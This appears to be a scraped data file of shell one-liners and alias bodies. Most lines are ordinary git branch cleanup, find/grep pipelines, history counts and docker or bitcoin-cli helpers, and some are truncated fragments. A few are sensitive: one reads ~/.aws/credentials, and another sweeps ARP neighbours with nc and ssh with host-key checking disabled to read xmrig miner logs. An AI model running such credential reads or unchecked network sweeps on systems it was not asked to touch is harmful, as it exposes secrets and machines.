"git branch --no-color --merged | command grep -vE ""^(\*|\s*(master|QA|QA-mid)\s*$)"" | command xargs -n 1 git branch -d"
"git branch --no-color --merged | command grep -vE ""^(*|s*(master|develop|dev)s*$)"" | command xargs -n 1 git branch -d"
"git branch --no-color --merged origin/master | command grep -vE ""^(\*|\s*(master|develop|dev)\s*$)"" | command xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*\|master\|develop\|trodriguez/bits_and_bobs"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -v master | grep -v production | grep -v integration | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -v master | grep -v develop | grep -v release | xargs -n 1 git branch -d && git remote prune origin"
"git branch --merged | grep -v ""\*"" | grep -v master | grep -v dev | grep -v yours-master | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -v master | grep -v dev | grep -v develop | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -v ""master"" | grep -v ""production"" | grep -v ""staging"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -v ""master"" | grep -v ""develop"" | grep -v ""staging"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -Ev ""(\*|master|develop|staging)"""
"git branch --merged | grep -Ev ""(\*|master|develop|staging)"" | xargs -n 1 git branch -d"
"git branch --merged | grep -Ev ""(\*|master|development|staging)"" | xargs -n 1 git branch -d"
"git branch --merged | egrep -v ""\*|master|production|staging"" | xargs git branch -d"
"git branch --merged | egrep -v ""\*|develop|staging|master"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|staging|production)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|dev|staging)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|dev|sculpin)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|dev|release)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|dev|production)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|dev|nerv)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|develop|uat)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|develop|staging)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|develop|release)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|development|dev)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(\*|dev|release-candidate|master)"" | xargs -n 1 git branch -d"
"git branch --merged | command grep -vE ""^(\*|\s*(master|develop|production)\s*$)"" | command xargs -n 1 git branch -d"
"git branch --merged | ag -v ""\*"" | ag -v staging | ag -v master | ag -v develop | xargs -n 1 git branch -d"
"git branch --merged master | grep -vE ""^\*|master|develop|staging$"" | xargs -I % git branch -d %"
"git branch --merged develop | grep -Ev ""(master|release|hotfix|develop)"" | xargs git branch -d"
"git br -r --merged | egrep -v ""(\*|master|release|HEAD)"" | xargs git branch -d -r"
"git br --merged | egrep -v ""(\*|master|release|HEAD)"" | xargs git branch -d"
"git --no-pager diff --color=never | grep -v -E ""^(\+\+\+|---) ""| grep -E ""^(-|\+)"" | count"
"gibo -l | tr ""\t"" ""\n"" | sed ""/^=/d"" | sort | peco | xargs gibo"
"gco master && git branch -r --merged | grep origin | grep -v '>' | grep -v master | xargs -L1 | awk '{split($0,a,"
"function _pms(){ expac -Ss ""%n|%v|%d"" $1 | column -t -s""|"" | sort; };_pms"
"for i in $(ls /sys/dev/char/10:7|grep -Ev ""dev|uevent|version|subsystem|power"");do echo ""$i:"";cat /sys/dev/char/10:7/$i;done"
"for i in $(arp -n | grep -v incomplete | grep bond0 | awk ""{print \$1}""); do nc -w 1 $i 22 </dev/null &>/dev/null && (ssh -o ""StrictHostKeyChecking=no"" $i journalctl -xe -u xmrig 2>/dev/null | grep [s]peed | tail -1 & wait) done"
"for i in $(arp -n | grep -v incomplete | grep bond0 | awk ""{print \$1}""); do nc -w 1 $i 22 </dev/null &>/dev/null && (ssh -o ""StrictHostKeyChecking=no"" $i journalctl -xe -u blur 2>/dev/null | grep [s]peed | tail -1 & wait) done"
"for font in `figlist | head -$(echo $(figlist | grep -n ""Figlet control files"" | cut -d : -f 1) - 1 | bc) | tail -n +4`; do echo $font; figlet -f $font Hello Kyle; done"
"for f in $(ls -1 redsea.*.txt | awk -F. ""{ print \$2 \"" \"" \$0; }"" | sort -n | awk ""{ print \$2; }"" ) ; do if [ $(grep -c \""ps\"": $f) -gt 0 ]; then echo -e ""\\n***\\n*** $f\\n***\\n"" ; cat $f |egrep ""\""pi\"":|\""ps\"":"" ; fi ; done"
"for d in `find . -type d | grep -v ""doxydocs\|external\|RPMBUILD\|build""`; do yes | cp tags $d/; done"
"for branch in `git branch -r | grep -v HEAD`;do echo -e `git show --pretty=format:""%Cred %cn %>|(40) %Cblue %ar %>|(80) %Creset"" $branch | head -n 1` $branch; done | sort -r"
"for branch in `git branch -r | grep -v HEAD`;do echo -e `git show --format=""%an"" $branch | head -n 1`; done | sort -r | uniq -c | sort -h"
"for DFs in $(ls -1p ~/.bash_* | grep -Ev ""history|logout|profile|back|/$""); do source ${DFs}; done"
"find ~/.ssh/ -type f | grep -v "".*\.pub\|config\|known_hosts"" | pick | xargs ssh-add"
"find kernel system -regex "".*\.\(cc\|cpp\|hpp\|h\|c\)"" | xargs etags"
"find `pwd`/spec \*\.rb | awk '{print $1}' | ack -v '\.$' | ack -v '^[0-9]{1,3}$' | ack -v ':$' | ack -v \"
"find . | grep -v ""\.git\|.svn\|.js.map"" | grep -v -s ""~"" | xargs grep -n -s -i --color"
"find . | grep -E ""(__pycache__|\.pyc|\.py~|\.pyo$)"" | xargs rm -rf"
"find . | grep -E ""(__pycache__|\.pyc|\.pyo$|\.pytest_cache)"" | xargs rm -rf"
"find . | egrep ""\.csv$|\.ini$|\.xeat$|\.xtct$"" | grep -v ""TestReport\.csv$"""
"find . \( -path .\/.git -o -path .\/.idea -o -path .\/.svn -o -path .\/.DS_Store \) -prune -o -type f -ls | awk ""{printf \$7; \$1 = \""\""; \$2 = \""\""; \$3 = \""\""; \$4 = \""\""; \$6 = \""\""; \$7 = \""\""; print \$0;}"" | sort -nr | tr -s "" "" | head -15 | awk ""function toDisplay(x) { split( \""b K M G T\"", v ); s = 1; while( x >= 1024 ){ x /= 1024; s++; } return sprintf(\""%d%s\"", int(x), v[s]); } {printf toDisplay(\$1); \$1 = \""\""; print \$0;}"" "
"find . -type f | while read f; do echo ""${f##*.}""; done | sed ""/^\s*$/d"" | sort | uniq -c | sort -rn"
"find . -type f | sed ""s|.*\.||"" | sort -u"
"find . -type f | sed ""s#.*/##"" | sort | uniq -c | sort -nr | egrep -v ""\s+1\s+"""
"find . -type f | grep -E "".*\.[a-zA-Z0-9]*$"" | sed -e ""s/.*\(\.[a-zA-Z0-9]*\)$/\1/"" | sort | uniq -c | sort -n -r'"
"find . -type f -regex "".*\.\(cc\|cpp\|hpp\|h\|c\)"" | xargs sed -i ""s/${1}/${2}/g"""
"find . -type f -regex "".*\.\(c\|h\|s\|S\|py\)"" -print0 | xargs -0 grep --color=auto -n"
"find . -type f -print0 | xargs -0 stat -f ""%m %N"" | sort -rn | head -1 | cut -f2 -d"" "" | xargs ls -alh"
"find . -type f -print0 | grep --color=no -zaiE "".*\.(hpp|h|hh|hxx)$"" | xargs -0 grep -aHn --color=$COLOR_FLAG"
"find . -type f -print0 | grep --color=no -zaiE "".*\.(cpp|c|cxx|cc)$"" | xargs -0 grep -aHn --color=$COLOR_FLAG"
"find . -type f -not -path "".git/*"" | sed ""s/.*\.\(.*\)/\1/p"" | grep -v ""/"" | sort | uniq -c | sort"
"find . -type f -name ""*\.???"" |rev |cut -c1-3 |rev |sort |uniq -c"
"find . -type f -and -name ""*.*"" -or -name ""*.cpp"" -or -name ""*.hpp"" -or -name ""*.c"" -or -name ""*.h"" -or -name ""*.sh"" | xargs cat | grep -v ^$ | grep -v / | grep -v \* | wc -l"
"find . -regex ""\(.*\.cpp\)\|\(.*\.hpp\)\|\(.*\.mk\)\|\(.*\.ttcn3\)"" | grep -vi test | xargs -P 25 grep --color -rins "
"find . -regex "".*\(__pycache__\|\.py[co]\)"" -delete || find . -iname *.pyc -delete || find . -iname *.pyo -delete"
"find . -print | grep -v '/\.' | sed -e 's;[^/]*/;|-- ;g;s;-- |; |;g'"""
"find . -name .git -or -name .svn -or -name .bzr -or -name .hg | while read dir ; do echo ""$dir"" | sed ""s|\(.\+\)/\.\([a-z]\+\)$|\2: \1|g"" ; done"
"find . -maxdepth 1 -type f | sed ""s|\./||"" | grep -v ""^\."""
"find . -ls | awk ""{printf \$7; \$1 = \""\""; \$2 = \""\""; \$3 = \""\""; \$4 = \""\""; \$6 = \""\""; \$7 = \""\""; print \$0;}"" | sort -nr | tr -s "" "" | head -15 | awk ""function toDisplay(x) { split( \""b K M G T\"", v ); s = 1; while( x >= 1024 ){ x /= 1024; s++; } return sprintf(\""%d%s\"", int(x), v[s]); } {printf toDisplay(\$1); \$1 = \""\""; print \$0;}"" "
"find -type f | egrep ""(\.asm|\.s|\.S)$"" | xargs cat | wc -l"
"find -name .git -or -name .svn -or -name .bzr -or -name .hg -or -name CSV | while read dir ; do echo ""$dir"" | sed ""s|\(.\+\)/\.\([a-z]\+\)$|\2: \1|g"" ; done"
"find $HOME/dev/aurora/ -name "".idea"" | egrep -v ""Aurora|Tests|Thrift|pipeline-"" | xargs rm -rf"
"export AWS_DEFAULT_PROFILE=`cat ~/.aws/credentials | grep -e ""\[\(.*\)\]"" | sed -e ""s/\[//g"" | sed -e ""s/\]//g"" | sort | peco`"
"export AWS_DEFAULT_PROFILE=`cat ~/.aws/credentials | grep -e ""\[\(.*\)\]"" | sed -e ""s/\[//g"" | sed -e ""s/\]//g"" | sort | fzf`"
"exiftool -r ""-comment<filename"" -d %Y%m%d_%H%M%S%%-c.%%le ""-filename<CreateDate"" -overwrite_original *.(jpg|jpeg|gif|JPG|mp4|MP4)"
"env|sort| egrep ""^J|^PATH|^LD_|^REPLAY"""
"env | sort | grep SSH ; echo ""----------""; ps auxxx | grep ssh-agent || echo ""ssh-agent not running""; echo ""----------""; ssh-add -l"
"egrep -v ""^\s*(//|/\s*\*|\*|;|#|$)"""
"echo; kill $( ps -eafww|grep update-manager|grep -v grep | grep update-manager | tr -s "" "" |cut -d"" "" -f2 ) > /dev/null 2>&1; echo ""sudo apt-get update && sudo apt-get dist-upgrade && [ -f /var/run/reboot-required ] && echo && echo reboot required && echo"";echo;sudo apt-get update && sudo apt-get dist-upgrade && [ -f /var/run/reboot-required ] && echo && echo reboot required && echo "
"echo | clang -x c++ -v -E - 2>&1 | sed -n '/^#include </,/^End/s|^[^/]*\([^ ]*/include[^ ]*\).*$|-I\1|p'"
"echo {a..z} {A..Z} | tr -d $(tmux lsk -T prefix | sed ""s/bind-key \(-r\)\{0,1\} *-T \w* *\([^ ]*\) .*/\2/"" | sed -n ""/^[a-zA-Z]$/p"" | tr -d [:space:]) | tr -d \ "
"echo db/migrate/`ls db/migrate -lt | head -n 2 | tail -n 1 | rev | cut -d "" "" -f 1 | rev`"
"echo GET / HTTP/1.1\\n\\n | nc olinjs.github.io 80 | head -n 1 | sed ""s:\(.*404.*\):no:"" | sed ""s:\(.*200.*\):yes:"" | say"
"echo -n ""HEAD: ""; gitloglast; echo """"; _gitflog; echo $(printf ""-%.0s"" {1..75}); sed ""/^\s*\(\s*\|Your branch is up-to.*\|On branch.*\|Changes.*\|no changes.*\|(.*)\)$/d"" <<< $(git -c color.status=always status)"
"echo $(git branch --merged | grep -v ""\*"" | grep -v ""master"" | grep -v ""staging"" | grep -v ""integration"") | xargs -n 1 git branch -d"
"echo $(curl -s https://btc-e.com/api/2/btc_usd/ticker | json_pp | grep last | cut -d : -f 2 | tr -d ,| tr -d ' ')"
"echo $(/sbin/ifconfig $(/usr/sbin/netstat -rn | awk '/^0.0.0.0/ {thif=substr($0,74,10); print thif;} /^default.*UG/ {thif=substr($0,65,10); print thif;}' | head -1) | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')"
"echo ""I"" | od -to2 | head -n1 | cut -f2 -d"" "" | cut -c6 | tr ""10"" ""LB"""
"echo ""Files changed since last deploy:"" && git show --pretty=""format:"" --name-only $(git tag | grep production_app | tail -1)...master | egrep ""^.+$"" | sort | uniq"
"echo ""Drive Size Used Avail Use Mounted on"";df -h|grep sd|column -t|sort && df -h --total|cut -c 1-11,17-37|tail -n1"
"echo ""10 i 2 o $(date +""%H%M""|cut -b 1,2,3,4 --output-delimiter="" "") f""|dc|tac|xargs printf ""%04d\n""|tr ""01"" "".*"""
"echo ""$(g_branchhistory | tail -n 2 | rev | tail -n 1 | rev)"" | xargs git checkout"
"du -k | f 2 1 | sort | f 2 1 | align | sed ""s/\.\// /"""
"docker stop $(docker ps | rev | cut -d"" "" -f1 | rev | tail -n +2 | fzf-tmux -r 30% --reverse --multi)"
"docker ps | sed -e 's/ /\+/g' -e 's/CONTAINER ID/CONTAINER_ID/' | tr -s '+' '\t' | tail -n+2 | q -t 'select c1,substr(c7, 0, 40),c2,c6 from -' | column -t"
"docker images|tail -n +2|tr -s "" ""|grep ""<none>""|cut -d"" "" -f 3|xargs docker rmi -f"
"docker image rm $(docker image ls | head -n 2 | tail -n 1 | awk ""{print \$3}"" 2>/dev/null || \
"diff <(cat ~/films-hidden.txt ~/films-seen.txt|sort) <(ls -1 --color=never) | grep -oP ""(?<=^> ).*"" | grep -v ^\@eaDir | grep -v ""\.\(zip\|srt\)$"""
"df -hT | egrep Sys. && ( df -hT | egrep ""^/dev/|^[[:blank:]]"" | egrep ""^/dev/|[[:digit:]][[:digit:]]*%"") "
"df -h | grep -vP ""docker|tmpfs|udev"" | grep -iP ""dev|size"""
"df -h | egrep ""Filesystem|minesoc--vg-root|sdb1"" | egrep ""G|%"" --color"
"declare -a LIST=($(i=1; for branch in $(git branch --list | grep -v master | grep -v develop | sed s/\*//); do echo $branch; echo ""$(git rev-list -n 1 $branch)""; done)); CHOICE=$(dialog --clear --backtitle ""Select your poison"" --title ""Features to finish"" --menu ""Choose one of the following options:"" 40 100 4 ""$LIST[@]"" 2>&1 >/dev/tty); test -z $CHOICE || git flow feature finish ${CHOICE/feature\//} && git push --all"
"debian.packages_custom_get $(grep ^system_type ~/.system.conf | cut -f""2-"" -d""="" | sed ""s|[\""]||g"")"
"dcos service --inactive | grep "" False "" | rev | cut -d "" "" -f 3 | rev | xargs -L 1 dcos service shutdown"
"dblist | grep -v -E ""^(|postgres|template[01])$"" | iselect -am | xargs -n1 dropdb -i"
"date --help|sed ""/^ *%a/,/^ *%Z/!d;y/_/!/;s/^ *%\([:a-z]\+\) \+/\1_/gI;s/%/#/g;s/^\([a-y]\|[z:]\+\)_/%%\1_%\1_/I""|while read L;do date ""+${L}""|sed y/!#/%%/;done|column -ts_"
"data=$(ps -eo size,rss,vsz,pid,user,cmd | awk ""{ if ( NR > 1 ) { print } }""); echo ""$data"" | egrep -v ""[ ^I]+0[ ^I]+0[ ^I]+"" | grep -v ""ps -eo "" | grep -v ""awk { if ( NR > 1 ) { print } }"" | sort -nr"
"d=($(git branch --merged | grep -Ev develop\|master | sed -e ""s/^\*//"" -e ""s/^ *//g"" | uniq)); if [[ ${#d[@]} -gt 0 ]]; then echo ${d[@]} | xargs git branch -d; fi"
"cut -f2 -d"";"" ~/.zsh_history | cut -f1 -d"" "" | sort | uniq -c | sort -nr | head -n 30"
"cut -d "" "" -f 1 ~/.bash_history | sort | uniq -c | sort -n | sed ""s/^ *[0-9]* //"" | tail -n 15"
"curl http://www.reddit.com/r/latvianjokes/hot/.json?limit=1 2>/dev/null | grep -Po ""\""selftext\"": \""\K(.*?)[^\\\]\"","" | sed ""s/.\{2\}$//"" | sed ""s@\\\\@@g"" | tail -n1 | fold -sw 70"
"curl -s https://api.coindesk.com/v1/bpi/historical/close.json | grep -oP '[:]{1}[0-9.]{6,8}[,]{1}' | sed 's/://g' | tr '\n' ' ' | tee <(spark) | sort -rn"
"curl -s -H ""X-Papertrail-Token: $PAPERTRAIL_API_TOKEN"" https://papertrailapp.com/api/v1/groups.json | jq -r "".[0].systems | map(.name) | .[]"" | fzf | xargs papertrail -f -s"
"curl -s ""https://api.opennic.org/geoip/?jsonp&res=4&ipv=4"" | grep -Po ""\b(?:(?:2(?:[0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9])\.){3}(?:(?:2([0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9]))\b"""
"cur=$(git rev-parse --abbrev-ref HEAD); prev=$(git rev-parse --abbrev-ref @{-1}); git for-each-ref --sort=committerdate refs/heads/ --format=""%(color:reset) %(refname:short)|%(color:black bold)%(committerdate:relative)%(color:reset)"" | column -ts""|"" | sed -e ""s, ${cur} ,$(tput setaf 2)$(tput bold)* ${cur} $(tput sgr0),"" | sed -e ""s, ${prev} ,$(tput setaf 3)$(tput bold) ${prev} $(tput sgr0),"";"
"cuke `echo $(git st | grep ""\.feature"" | grep -v deleted | cut -f 2 -d ""#"" | cut -f 2 -d "":"" | uniq)`"
"ctags -R --exclude=node_modules --exclude=.next && sed -i -E ""/^(if|switch|function|module\.exports|it|describe).+language:js$/d; /\.lua/d"" tags"
"cst | grep -E ""^(\?|M|A|C|R)"""
"cppcheck --enable=all -v . | grep -v ""Checking\|Defines\|Includes\|Platform\|\d"""
"cowsay -l | grep -v ""^Cow"" | sed -e ""s% %\n%g"" | sed -e ""s%\(.*\)%cowsay -f \1 Now I am a \1%"" | sh | less"
"colorls --tree=1 --sd --gs -a | h ""0-github|2-com"" 1-drive 2-mac "".gitconfig|.gitignore|.ssh|.zshrc"""
"clear;echo ""Drive Size Used Avail Use Mounted on"";df -h|grep sd|column -t|sort && df -h --total|cut -c 1-11,17-37|tail -n1"
"clear ; ps xc | awk '{ print \$1, \$5 }' | sed 1d | sort -fk 2 | column -t | column"
"cd /home/nms; host=$(hostname); ip=$(cat /etc/sysconfig/network-scripts/ifcfg-* |grep IPADDR |grep -v 127.0.0.1|head -1|cut -d= -f2 |tr ""[ \t]"" ""[]""); ymd=$(date +%Y%m%d.%H%M%S); file=uvpa.$host.$ip.$ymd.tar; tar cfvh $file uvpa/; gzip -f $file && ls -l $(pwd)/uvpa*gz;"
"cat ~/.zsh_history|cut -f1 -d"" ""|sort|uniq -c|sort -nr|head -n10"
"cat ~/.zsh_history | cut -d "";"" -f 2- | cut -d "" "" -f 1-4 | sort | uniq -c | sort -g"
"cat ~/.bash_history|cut -f1 -d"" ""|sort|uniq -c|sort -nr|head -n10"
"cat ~/.bash_history | cut -d' ' -f1,2 | sort | uniq -c | sort -rn | head"
"cat ~/.bash_history | cut -d "" "" -f1 | sort | uniq -c | sort -nr | head -15"
"cat pom.xml | grep -P ""(<coeus\-api\-all\.version)|(<coeus\-s2sgen\.version)|(<rice\.version)|(<schemaspy\.version)|(<version>[a-zA-Z\d\.\-]+</version>)"""
"cat package.json | ack --no-color ""\""((mad-logs)|(mad-utils)|(@ottawamhealth\/canimmunize-kavalinscript)|(env-var-helpers)|(common-constants))\"""":"
"cat nohup.out ; tail log/regtest_log; cat log/regtest_log | g ""result \[""; cat log/regtest_log | g ""result \[0\|\[test crash"";tail -f log/regtest_log | g ""result \[0\|\[crash"""
"cat <<EOF | grep -Ei ""file|sha\-1"" | tr -d ""\n"" | sed -re ""/File|SHA\-1/{s/[ ]*File/Received file/g;s/[ ]*SHA-1(.*)/ \(SHA\-1\1\)/g}""; echo "
"cat /var/log/nginx/access.log| grep -v "" -]"" | cut -d "" "" -f 1,2,8,10 | sed -e ""s/\]//""| sort -nr -k3,3 | head -n 70"
"cat ""$HISTFILE""|nkf -w|cut -d"" "" -f1|sort|uniq -c|sort -nr"
"bundle exec rspec `echo $(git st | grep _spec.rb | grep -v deleted | cut -f 2 -d ""#"" | cut -f 2 -d "":"" | uniq)`"
"brew upgrade && for cask in $(brew cask list); do brew cask info $cask | head -3 | grep -v ""^http"" | sed -e ""/^$cask: /s/$cask: \([^ ]*\).*$/\1/"" -e ""/^.*\/$cask/s/\/usr\/local\/Caskroom\/$cask\/\(.*\) (.*)$/\1/"" | paste -d "" "" - - | read current installed && if [[ ""$current"" != ""$installed"" ]]; then echo ""Upgrading $cask from $installed to $current""; brew cask upgrade --greedy $cask; else echo ""$cask:$current is latest version""; fi; done"
"brew cask outdated |grep -v ""capture-one"" |grep -v ""synergy"" |grep -v ""path-finder"" |grep -v ""screaming-frog-seo-spider"" | awk "
"br=$(git branch --contains HEAD | sed -rn ""s/^\* //p""); if ! git ls-remote . | grep -q -e ""refs/remotes/.*/${br}""; then br=""master""; fi; xdg-open $(git config -l | sed -rn ""s%remote.origin.url=git(@|://)(github.com)(:|/)(.+/.+).git%https://\2/\4/tree/${br}%p"")"
"bitcoin-cli getwalletinfo | egrep ""\""balance\""""; bitcoin-cli getnetworkinfo | egrep ""\""version\""|connections""; bitcoin-cli getmininginfo | egrep ""\""blocks\""|errors"""
"bitcoin-cli getwalletinfo | egrep ""\""balance\""""; bitcoin-cli getinfo | egrep ""\""version\""|connections""; bitcoin-cli getmininginfo | egrep ""\""blocks\""|errors"""
"bitcoin-cli getwalletinfo | egrep ""\""balance\""""; bitcoin-cli -getinfo | egrep ""\""version\""|connections""; bitcoin-cli getmininginfo | egrep ""\""blocks\""|errors"""
"bitcoin-cli getinfo | egrep ""\""version\""|balance|blocks|connections|errors"""
"bitcoin-cli -testnet getwalletinfo | egrep ""\""balance\""""; bitcoin-cli -testnet -getinfo | egrep ""\""version\""|connections""; bitcoin-cli -testnet getmininginfo | egrep ""\""blocks\""|errors"""
"bitcoin-cli -testnet getinfo | egrep ""\""version\""|balance|blocks|connections|errors"""
"bitcoin-cli -regtest getinfo | egrep ""\""version\""|balance|blocks|connections|errors"""
"aws ec2 describe-instances --filter Name=tag:Owner,Values=deoakshay | jq '.Reservations | .[] | .Instances | .[] | {\"
"aws ec2 describe-instances --filter Name=tag:Name,Values=$1 | jq '.Reservations | .[] | .Instances | .[] | {\"
"awk '{print \$2}'|sort|uniq -c|sort -rn|head -20| \
"alias | egrep -i ""ruby|rails|rake|spring|rspec"""
"ack -A 5 --color-match=RED --pager=""less -RSFX"" ""TODO|XXX|FIXME|HACK|OMG|LOL"""
"a=$(searchcommands);echo -n ""$a""|sed -e :a -e ""/^\n*$/{$d;N;ba"" -e ""}""|tr -d ""\n"" |head -n 1|xargs echo -n | clip2"
"`notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e 's/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//')""'"
"`git branch -a | grep -v ""remotes"" | peco --prompt ""GIT BRANCH>"" | head -n 1 | sed -e ""s/^\*\s*//g"" | xargs git checkout`"
"`echo S | sed ""s/\([0-9a-f]*\)/\1..\1^/"" | xargs git diff --name-only | peco --prompt ""GIT DIFF FILE>"" | head -n 1 | sed ""s/^\(\S*\).*/\1/""`"
"_(){ cat $@ | ack -v ""^\s*(//|/\*|\*)""| ack -v ""^\s*$"" | wc; }; _"
"\history -1000 -1 | sed ""s/^[[:space:]]*[0-9]*[[:space:]]*//"" | sort | uniq -c | sort -n -r | head -n 30"
"\""cat ~/mosbuild.log | grep 'COMPONENT\|STEP\|Compile \| END\|Error'\"""" >> part2$MOSBUILD_DIR/../.bash_aliases"
"[[ ! $(uname -n) =~ ^(utility|web|dbmaster|pod)- ]] && (sudo dscacheutil -flushcache;sudo killall -HUP mDNSResponder; echo -e ""\033[1;32mDNS Cache Flushed.\033[0m"") || echo ""Cannot be run on a pod. :("""
"TAG_NAME=$(herbstclient attr tags.focus.name 2> /dev/null || i3-msg -t get_workspaces | jq -r "".[] | select(.focused == true) | .name"" 2> /dev/null ) && if tmux has-session -t $TAG_NAME >/dev/null; then tmux attach-session -t $TAG_NAME; else tmux new-session -s $TAG_NAME -n $TAG_NAME; fi"
"LC_COLLATE=C tree -aC -I "".git|node_modules|bower_components|plugged|__pycache__|CMakeFiles"" --dirsfirst"
"HISTTIMEFORMAT="""" history | sed -nre ""s/^\s*[0-9]+\s*(\w+).*$/\1/p"" | sort | uniq -c | sort -rg | head -15"
"FILES=$(git status --short | sed ""s/^[ ]//g"" | egrep ""^[A-Z]"" | cut -d "" "" -f2 | fzf) && echo $FILES | xargs -L1 -t git update-index --assume-unchanged"
"D=/home/system/flac; T=`mktemp`; cd $D && unbuffer flactime -a . |tee $T && gzip - <$T |base64 |ssh mac ""base64 -d |gzip -d | mutt -s \""musac counts\"" -- andy"" && cd - && rm $T"
"CURR=`git branch | grep ""\*"" | tr -d ""*""`; git fetch; for x in $(git branch -vv | grep origin | tr -d ""*"" | awk "
"2>&1 | sed ""s/.*Will write://"" | $(shorten_paths) | sort | uniq -c | sort -n"
"/usr/local/bin/sudo /usr/local/bin/gdb6 /home/y/bin/yapache $(/bin/ps axuw | /usr/bin/grep yapache | /usr/bin/egrep -e ""nobody|yahoo"" | /usr/bin/cut -c 7-14 | /usr/bin/head -1)"
"/usr/bin/find . -regex "".*\.\(c\|h\|hpp\|cc\|cpp\)"" -print | /usr/bin/ctags --c++-kinds=+px --fields=+aimSz --languages=c++ --sort=yes -L -"
"/sbin/iwlist scanning 2>/dev/null | grep -e ""Cell"" -e ""Channel:"" -e ""Encryption"" -e ""ESSID"" -e ""WPA"" | sed ""s|Cell|\nCell|g"""
"/sbin/ifconfig | grep -E -A3 ""e(th|n)0"" | grep -Eo ""inet (addr:)?([0-9]*\.){3}[0-9]*"" | grep -Eo ""([0-9]*\.){3}[0-9]*"" | grep -v ""127.0.0.1"""
"/bin/ps -aux --forest | /bin/grep -Ev ""root |bin |ps |ps -a"" | /usr/bin/sort"
"/bin/ps -acux --forest | /bin/grep -Ev ""root |bin | ps| grep"" | /usr/bin/sort"
"./vendor/bin/phpmd `git diff --name-only --diff-filter=d upstream/master..HEAD | grep .php | tr '\n' ',' | rev | cut -c 2- | rev` text ./vendor/behance/phpmd-rules/phpmd.xml.dist"
".. && cd /home/snow/gitolite/wubook/src/zak && Grep pdb | grep -v ""propdb"" | grep -v ""itcopdb"" | grep -v ""pdb.save"" | grep -v ""pdb="" | grep -v ""updbo"""
"-c ""set sw=2 | %s/>/>\r/ | set ft=html | execute \""normal gg=G\"" | set nohlsearch | g/^\\s*\$/d"""
",di master..HEAD --name-only | sed -E 's|apps/([a-z0-9_\.\-]+)/.+|\1|' | uniq"
",di master..HEAD --name-only -- ../**/priv/repo/migrations/. | sed -E 's|apps/([a-z0-9_\.\-]+)/.+|\1|' | uniq"
"$(kubectl api-resources | fzf | awk ""{print \$1}"" | xargs k get | fzf | awk ""{print \$1}"" )"
"$(git remote -v 2> /dev/null | grep github | sed -e ""s/.*git\:\/\/\([a-z]\.\)*/\1/"" -e ""s/\.git$//g"" -e ""s/.*@\(.*\)$/\1/g"" | tr "":"" ""/"" | tr -d ""\011"" | sed -e ""s/^/open http:\/\//g"")"
"$'sudo docker ps -a | awk \'{ print $1,$2 }\' | grep bitnami/redis:5.0-debian-9 | awk \'{print $1 }\' | xargs -I {} docker stop {} | xargs -I {} docker rm {} && cd /var/www/docker-dev && sudo docker-compose up -d'"
"!""git branch --all | tr -d '* ' | grep -v -e '->' | peco | sed -e 's+remotes/[^/]*/++g' | xargs git checkout"""
" | cut -d' ' -f2 | cut -d'-' -f1 | sort | uniq | xargs)
" git branch --merged | grep -v ""\*"" | grep -v ""master"" | grep -v ""develop"" | grep -v ""staging"" | xargs -n 1 git branch -d "
" ""git for-each-ref --sort=-committerdate refs/heads --format='%(HEAD)%(color:yellow)%(refname:short)|%(color:bold green)%(committerdate:relative)|%(color:blue)%(subject)|%(color:magenta)%(authorname)%(color:reset)'|column -ts'|'"""
!r(){git for-each-ref --sort=-committerdate refs/heads --format='%(HEAD)%(color:yellow)%(refname:short)|%(color:bold green)%(committerdate:relative)|%(color:blue)%(subject)|%(color:magenta)%(authorname)%(color:reset)'|column -ts'|'}; r
~/trydoor; BacktrackTest e >& ~/X && cd .. || cd w >& ~/X && l||nogo
~/bin/firefox \$(k log \$(k get pods |awk '/gl-cly-jup.*Running/{print \$1; exit}') -c gl-cly-jup|sed -n '\|^ *http://0.0.0.0:8888/gitlab-celery/jupyter/?token|s/0.0.0.0:8888/kube.tls.renault.fr/p')
|& egrep -v '\.deprecated|\.hg|\.vimv|vimmappings'
| {pad(author|user, 10)}: {desc|strip|firstline}\n"""
| sort | uniq -c | sort -nr | head -n 25
| perl -pe 's/\e([^\[\]]|\[.*?[a-zA-Z]|\].*?\a)//g' | col -b
| pe | uniq| fzf -m | read filename; [ ! -z $filename ] && nvim $filename
| pe | fzf | read filename; [ ! -z $filename ] && echo -n $filename | xclip -selection c
| pe | fzf | read filename; [ ! -z $filename ] && echo -n $filename | xclip -sel c
| grep -v \.swp | grep -v log/ | grep -v tmp/ | grep -v vendor/rails/
| cut | sort | uniq -c | sort -n
{echo ---dirs--- && find . -maxdepth 1 -type d | sort | xargs -d\\n -Ix du -hs x && echo ---files--- && find . -maxdepth 1 -type f | sort | xargs -d\\n -Ix du -hs x}
yinst ls -config | grep 'requires os' | awk -F. '{print $1}' | sort -u | awk 'BEGIN {four=0; six=0} /4/ {four++} /6/ {six++} END {if (four>0 && six>0) { print
yes | sudo apt update; yes | sudo apt upgrade; yes | sudo apt dist-upgrade; yes | sudo apt autoremove
yes | sed 's|y|n|g'
xscreensaver-command -lock || gnome-screensaver-common -l || slock
xrdb -query | sed -n 's/.*color\([0-9]\)/\\1/p' | sort -nu | cut -f2 | hex2col
